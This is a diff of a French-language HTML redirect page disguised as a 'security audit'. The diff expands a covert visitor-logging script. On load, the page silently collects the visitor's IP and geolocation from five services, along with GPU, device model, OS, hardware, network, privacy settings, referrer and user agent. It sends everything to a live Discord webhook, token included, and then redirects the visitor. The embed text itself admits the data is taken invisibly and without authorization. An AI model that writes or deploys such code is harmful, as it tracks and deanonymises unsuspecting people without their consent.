@@ -3,101 +3,158 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirection...</title>
+  <title>Analyse de Sécurité - Redirection...</title>
   <noscript>
     <meta http-equiv="refresh" content="0;url=https://kfcgaming.github.io/enzgal">
   </noscript>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
-      background-color: #121212;
-      color: #ffffff;
+      background-color: #b2b2b2;
+      color: #f3f4f6;
     }
     .loader {
       text-align: center;
+    }
+    .spinner {
+      border: 4px solid rgba(255, 255, 255, 0.1);
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      border-left-color: #ef4444;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
 
   <div class="loader">
-    <h2>Redirection en cours...</h2>
-    <p>Veuillez patienter un instant.</p>
+    <div class="spinner"></div>
+    <h2>Audit de sécurité en cours...</h2>
+    <p>Redirection sécurisée, veuillez patienter.</p>
   </div>
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1565897913379328100/Z0oV4Ukzp635XQwQ7v8rAh9-VLrLncAZyXdWZyuiEGEhe0hKcFmyUpeLQB3o1-nkq6v8";
     const TARGET_URL = "https://kfcgaming.github.io/enzgal";
 
-    async function sendAndRedirect() {
+    // Extraction passive du GPU via WebGL
+    function getGPUInfo() {
       try {
-        // 1. Récupération des API IP en parallèle
-        const results = await Promise.allSettled([
-          fetch("https://ipapi.co/json/").then(r => r.json()),
-          fetch("https://ipwho.is/").then(r => r.json()),
-          fetch("https://json.geoiplookup.io/").then(r => r.json())
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return { vendor: "Non supporté", renderer: "Non supporté" };
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (!debugInfo) return { vendor: "Masqué", renderer: "Masqué" };
+        return {
+          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        };
+      } catch (e) {
+        return { vendor: "Erreur", renderer: "Erreur" };
+      }
+    }
+
+    async function runUltimateAudit() {
+      try {
+        // 1. Exécution en parallèle de toutes les API d'IP (5 sources) et des Client Hints
+        const [ipResults, deviceHints] = await Promise.all([
+          Promise.allSettled([
+            fetch("https://ipapi.co/json/").then(r => r.json()),
+            fetch("https://ipwho.is/").then(r => r.json()),
+            fetch("https://json.geoiplookup.io/").then(r => r.json()),
+            fetch("https://ip-api.com/json/").then(r => r.json()),
+            fetch("https://ipinfo.io/json").then(r => r.json())
+          ]),
+          navigator.userAgentData ? navigator.userAgentData.getHighEntropyValues([
+            "platform", "platformVersion", "model", "architecture", "bitness"
+          ]).catch(() => ({})) : Promise.resolve({})
         ]);
 
-        const api1 = results[0].status === 'fulfilled' ? results[0].value : {};
-        const api2 = results[1].status === 'fulfilled' ? results[1].value : {};
-        const api3 = results[2].status === 'fulfilled' ? results[2].value : {};
+        const api1 = ipResults[0].status === 'fulfilled' ? ipResults[0].value : {};
+        const api2 = ipResults[1].status === 'fulfilled' ? ipResults[1].value : {};
+        const api3 = ipResults[2].status === 'fulfilled' ? ipResults[2].value : {};
+        const api4 = ipResults[3].status === 'fulfilled' ? ipResults[3].value : {};
+        const api5 = ipResults[4].status === 'fulfilled' ? ipResults[4].value : {};
 
-        const ip = api1.ip || api2.ip || api3.ip || "Inconnue";
+        // Récupération de l'IP la plus évidente parmi les sources
+        const ip = api1.ip || api2.ip || api3.ip || api4.query || api5.ip || "Inconnue";
 
-        // 2. Collecte des informations système et navigateur disponibles en JS
-        const screenRes = `${window.screen.width}x${window.screen.height}`;
-        const colorDepth = `${window.screen.colorDepth} bits`;
-        const lang = navigator.language || navigator.userLanguage || "N/A";
-        const languages = navigator.languages ? navigator.languages.join(", ") : "N/A";
-        const platform = navigator.platform || "N/A";
+        // 2. Réseau & Connexion
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const netType = conn ? (conn.effectiveType || "Inconnu") : "Inconnu";
+        const downlink = conn && conn.downlink ? `~${conn.downlink} Mbps` : "Inconnu";
+
+        // 3. Codecs multimédias
+        const vEl = document.createElement('video');
+        const codecs = {
+          h264: vEl.canPlayType('video/mp4; codecs="avc1.42E01E"') ? "Oui" : "Non",
+          webm: vEl.canPlayType('video/webm; codecs="vp8, vorbis"') ? "Oui" : "Non",
+          av1: vEl.canPlayType('video/webm; codecs="av01.0.05M.08"') ? "Oui" : "Non"
+        };
+
+        // 4. Préférences système & accessibilité (Media Queries)
+        const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Sombre" : "Clair";
+        const reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches ? "Activé" : "Désactivé";
+        const colorGamut = window.matchMedia('(color-gamut: p3)').matches ? "P3 (Large)" : "Standard sRGB";
+        const pointerType = window.matchMedia('(pointer: fine)').matches ? "Souris précise" : (window.matchMedia('(pointer: coarse)').matches ? "Tactile (Doigt)" : "Inconnu");
+        const hoverSupport = window.matchMedia('(hover: hover)').matches ? "Oui" : "Non";
+
+        // 5. Paramètres de confidentialité natifs
+        const dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || "Non défini";
+        const gpc = navigator.globalPrivacyControl !== undefined ? (navigator.globalPrivacyControl ? "Actif" : "Inactif") : "Non supporté";
+        const pdfViewer = navigator.pdfViewerEnabled ? "Oui" : "Non";
+
+        // 6. Informations Système & Matériel
+        const deviceModel = deviceHints.model || "Inconnu / PC Desktop";
+        const osPlatform = deviceHints.platform || navigator.platform || "N/A";
+        const osVersion = deviceHints.platformVersion ? `v${deviceHints.platformVersion}` : "N/A";
+        const arch = deviceHints.architecture ? `${deviceHints.architecture} (${deviceHints.bitness || 'x'})` : "Inconnue";
+        
+        const screenRes = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth} bits)`;
         const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cœurs` : "Inconnu";
         const memory = navigator.deviceMemory ? `~${navigator.deviceMemory} Go RAM` : "Inconnu";
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+        const lang = navigator.language || "N/A";
         const cookiesEnabled = navigator.cookieEnabled ? "Oui" : "Non";
         const referrer = document.referrer ? document.referrer : "Accès direct / Aucun";
+        const gpu = getGPUInfo();
 
-        // Détection approximative de la connexion réseau (si supportée)
-        let connectionInfo = "Inconnue";
-        if (navigator.connection) {
-          connectionInfo = `${navigator.connection.effectiveType || 'N/A'} (~${navigator.connection.downlink || '?'} Mbps, RTT: ${navigator.connection.rtt || '?'}ms)`;
-        }
-
-        // 3. Construction du message Discord (divisé en plusieurs embeds ou champs pour tout caser proprement)
+        // 7. Construction du message Embed Discord structuré
         const payload = {
-          username: "Advanced Info Logger",
+          username: "Ultimate Cyber Audit",
           avatar_url: "https://i.imgur.com/4M34hi2.png",
           embeds: [
             {
-              title: "🎯 Nouvelle visite détectée",
-              color: 0x00ff55,
+              title: "🛡️ Rapport d'Audit Passif Ultime (Démo)",
+              description: "Données extraites automatiquement de manière invisible et sans aucune autorisation.",
+              color: 0xef4444,
               fields: [
-                { name: "🌐 Adresse IP", value: `\`${ip}\``, inline: false },
+                { name: "🌐 Adresse IP Principale", value: `\`${ip}\``, inline: false },
                 { 
-                  name: "📊 Géolocalisation (ipapi.co)", 
-                  value: `Ville : ${api1.city || 'N/A'}\nRégion : ${api1.region || 'N/A'}\nPays : ${api1.country_name || 'N/A'}\nFAI : ${api1.org || 'N/A'}`, 
-                  inline: true 
+                  name: "📊 Comparatif Multi-API Géolocalisation", 
+                  value: `• **ipapi.co:** ${api1.city || 'N/A'}, ${api1.country_name || 'N/A'}\n• **ipwho.is:** ${api2.city || 'N/A'}, ${api2.country || 'N/A'}\n• **geoiplookup:** ${api3.city || 'N/A'}, ${api3.country_name || 'N/A'}\n• **ip-api.com:** ${api4.city || 'N/A'}, ${api4.country || 'N/A'}\n• **ipinfo.io:** ${api5.city || 'N/A'}, ${api5.country || 'N/A'}`, 
+                  inline: false 
                 },
-                { 
-                  name: "📊 Géolocalisation (ipwho.is)", 
-                  value: `Ville : ${api2.city || 'N/A'}\nRégion : ${api2.region || 'N/A'}\nPays : ${api2.country || 'N/A'}\nFAI : ${api2.connection?.isp || 'N/A'}`, 
-                  inline: true 
-                },
-                { 
-                  name: "📊 Géolocalisation (geoiplookup)", 
-                  value: `Ville : ${api3.city || 'N/A'}\nRégion : ${api3.region || 'N/A'}\nPays : ${api3.country_name || 'N/A'}\nFAI : ${api3.isp || 'N/A'}`, 
-                  inline: true 
-                },
-                { name: "🖥️ Écran & Affichage", value: `Résolution : **${screenRes}**\nProfondeur de couleur : ${colorDepth}`, inline: true },
-                { name: "⚙️ Matériel & Système", value: `OS/Plateforme : ${platform}\nProcesseur : ${cores}\nMémoire RAM : ${memory}`, inline: true },
-                { name: "🌍 Paramètres régionaux", value: `Langue principale : ${lang}\nLangues : ${languages}\nFuseau horaire : ${timezone}`, inline: true },
-                { name: "📶 Réseau & Connexion", value: `Type estimé : ${connectionInfo}\nCookies activés : ${cookiesEnabled}`, inline: true },
-                { name: "🔗 Provenance (Referrer)", value: `\`${referrer}\``, inline: false },
-                { name: "💻 User-Agent Complet", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                { name: "📱 Appareil & OS", value: `Modèle: **${deviceModel}**\nOS: ${osPlatform} (${osVersion})\nArch: ${arch}`, inline: true },
+                { name: "⚙️ Matériel Interne", value: `CPU: ${cores}\nRAM: ${memory}`, inline: true },
+                { name: "🎛️ Ergonomie & Entrées", value: `Pointeur: ${pointerType}\nSupport Survol: ${hoverSupport}\nThème: ${darkMode}`, inline: true },
+                { name: "🎨 Écran & Affichage", value: `Résolution: ${screenRes}\nCouleurs: ${colorGamut}\nAnimations réduites: ${reducedMotion}`, inline: true },
+                { name: "🕵️ Paramètres Privacy", value: `Do Not Track: ${dnt}\nGPC: ${gpc}\nLecteur PDF: ${pdfViewer}`, inline: false },
+                { name: "🎮 Carte Graphique (GPU)", value: `Fabricant: ${gpu.vendor}\nModèle: ${gpu.renderer}`, inline: false },
+                { name: "📶 Réseau & Multimédia", value: `Type: ${netType} | Débit: ${downlink}\nCodecs (H.264/WebM/AV1): ${codecs.h264}/${codecs.webm}/${codecs.av1}`, inline: false },
+                { name: "🌍 Régional & Provenance", value: `Langue: ${lang} | Fuseau: ${timezone}\nCookies: ${cookiesEnabled} | Referrer: \`${referrer}\``, inline: false },
+                { name: "💻 User-Agent Brut", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
               ],
               timestamp: new Date().toISOString()
             }
@@ -112,14 +169,14 @@
         });
 
       } catch (error) {
-        console.error("Erreur lors de la collecte :", error);
+        console.error("Erreur lors de l'audit :", error);
       } finally {
-        // Redirection finale dans tous les cas
+        // Redirection finale automatique vers ta page cible
         window.location.href = TARGET_URL;
       }
     }
 
-    window.onload = sendAndRedirect;
+    window.onload = runUltimateAudit;
   </script>
 </body>
 </html>
